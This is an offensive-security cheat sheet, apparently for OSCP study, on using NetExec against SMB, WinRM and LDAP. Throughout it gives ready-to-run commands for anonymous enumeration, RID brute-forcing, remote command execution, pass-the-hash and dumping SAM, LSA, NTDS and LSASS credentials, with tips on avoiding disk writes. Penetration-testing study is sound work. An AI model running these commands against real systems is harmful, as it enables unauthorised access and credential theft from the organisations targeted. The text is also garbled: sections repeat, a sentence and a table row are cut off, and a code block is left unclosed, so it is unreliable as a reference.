---
# NetExec - Swiss Army Knife for Network Authentication Testing

NetExec (`nxc`) is the maintained fork of CrackMapExec. Most people associate it with Active Directory, but it is equally useful on non-AD assessments - any time you hit SMB or WinRM, NetExec belongs in your workflow.

---

## Why NetExec

The core value is speed and consistency. Instead of juggling multiple tools for credential validation, share enumeration, and post-exploitation, NetExec handles all of it through a single interface across SMB, WinRM, LDAP, RDP, and SSH. On OSCP, time and mental overhead are your real constraints - having one tool that does everything means fewer context switches and fewer mistakes.

---

## SMB

### Credential Validation
---

## Why NetExec

The core value is speed and consistency. Instead of juggling multiple tools for credential validation, share enumeration, and post-exploitation, NetExec handles all of it through a single interface across SMB, WinRM, LDAP, RDP, and SSH. On OSCP, time and mental overhead are your real constraints - having one tool that does everything means fewer context switches and fewer mistakes.

---

## SMB

### Credential Validation

```bash
nxc smb 10.10.10.10 -u user -p password

The output tells you immediately what you have. [+] means valid credentials. (Pwned!) next to the result means the account has local admin rights on that machine - you can dump hashes without any further escalation.

---
Share Enumeration

Anonymous and guest access is worth testing on every assessment - including non-AD ones:

nxc smb 10.10.10.10 -u '' -p ''

nxc smb 10.10.10.10 -u guest -p ''

With valid credentials:

nxc smb 10.10.10.10 -u user -p password --shares

---
User Enumeration

When guest auth is enabled, check the description field - developers and sysadmins occasionally store forgotten credentials there:

nxc smb 10.10.10.10 -u '' -p '' --users

With valid credentials:

nxc smb 10.10.10.10 -u user -p password --users

--rid-brute does not require credentials if guest auth is enabnd resolves them to account names - useful for building a
username list before you have any valid credentials:

nxc smb 10.10.10.10 -u '' -p '' --rid-brute

---
Remote Command Execution

Requires local admin. Use -x for cmd.exe and -X for PowerShell:

nxc smb 10.10.10.10 -u user -p password -x whoami

nxc smb 10.10.10.10 -u user -p password -X whoami

---
Credential and Hash Dumping

Once you have local admin rights, NetExec handles remote dumps without touching disk on the target - no Mimikatz upload required.

SAM database - local account hashes:

nxc smb 10.10.10.10 -u user -p password --sam

LSA secrets - service account credentials and cached domain creds:

nxc smb 10.10.10.10 -u user -p password --lsa

NTDS.dit - all domain account hashes (requires DC access):

nxc smb 10.10.10.10 -u user -p password --ntds

In-memory credential dumping via lsassy - no binary upload to disk:

nxc smb 10.10.10.10 -u user -p password -M lsassy

Alternative in-memory dump - useful when lsassy is blocked:

nxc smb 10.10.10.10 -u user -p password -M nanodump

See who is currently logged in:

nxc smb 10.10.10.10 -u user -p password --loggedon-users

--sam and --lsa are the fastest options. lsassy is more powerful but noisier. On OSCP, --sam first - it is fast and gets you local hashes immediately for pass-the-hash or cracking.

---
Pass the Hash

All SMB commands accept NT hashes instead of a password:

nxc smb 10.10.10.10 -u administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

---
WinRM

Check if the account can authenticate to WinRM:

nxc winrm 10.10.10.10 -u user -p password

(Pwned!) means the account has WinRM access and you can get a shell via Evil-WinRM. Execute commands directly:

nxc winrm 10.10.10.10 -u user -p password -x whoami

---
LDAP

Anonymous bind - leaks users, groups, and sometimes password policy without any credentials:

nxc ldap 10.10.10.10 -u '' -p ''

User enumeration with valid credentials:

nxc ldap 10.10.10.10 -u user -p password --users

BloodHound data collection - replaces SharpHound when you want to avoid uploading a binary to the target:

nxc ldap 10.10.10.10 -u user -p password --bloodhound --collection All

---
Quick Reference

┌──────────┬───────────────────┬───────────────────────────────────────────────────────────┐
│ Protocol │     Use Case      │                          Command                          │
├──────────┼───────────────────┼───────────────────────────────────────────────────────────┤
│ SMB      │ Check local admin │ nxc smb IP -u user -p pass                                │
├──────────┼───────────────────┼───────────────────────────────────────────────────────────┤
│ SMB      │ Anonymous access  │ nxc smb IP -u '' -p ''                                    │
├──────────┼───────────────────┼───────────────────────────────────────────────────────────┤
│ SMB      │ List shares       │ nxc smb IP -u user -p pass --shares                       │
├──────────┼───────────────────┼───────────────────────────────────────────────────────────┤
│ SMB      │ Enumerate users   │ nxc smb IP -u user -p pass --users                        │
├──────────┼───────────────────┼───────────────────────────────────────────────────────────┤
│ SMB      │ RID brute         │ nxc smb IP -u '' -p '' --rid-brute                        │
├──────────┼───────────────────┼───────────────────────────────────────────────────────────┤
│ SMB      │ Dump SAM          │ nxc smb IP -u user -p pass --sam                          │
├──────────┼───────────────────┼───────────────────────────────────────────────────────────┤
│ SMB      │ Dump LSA          │ nxc smb IP -u user -p pass --│
├──────────┼───────────────────┼───────────────────────────────────────────────────────────┤
│ SMB      │ In-memory dump    │ nxc smb IP -u user -p pass -M lsassy                      │
├──────────┼───────────────────┼───────────────────────────────────────────────────────────┤
│ SMB      │ All domain hashes │ nxc smb IP -u user -p pass --ntds                         │
├──────────┼───────────────────┼───────────────────────────────────────────────────────────┤
│ SMB      │ Execute command   │ nxc smb IP -u user -p pass -x cmd                         │
├──────────┼───────────────────┼───────────────────────────────────────────────────────────┤
│ WinRM    │ Check access      │ nxc winrm IP -u user -p pass                              │
├──────────┼───────────────────┼───────────────────────────────────────────────────────────┤
│ LDAP     │ Anonymous bind    │ nxc ldap IP -u '' -p ''                                   │
├──────────┼───────────────────┼───────────────────────────────────────────────────────────┤
│ LDAP     │ BloodHound        │ nxc ldap IP -u user -p pass --bloodhound --collection All │
└──────────┴───────────────────┴──────────────────────────────┘

---
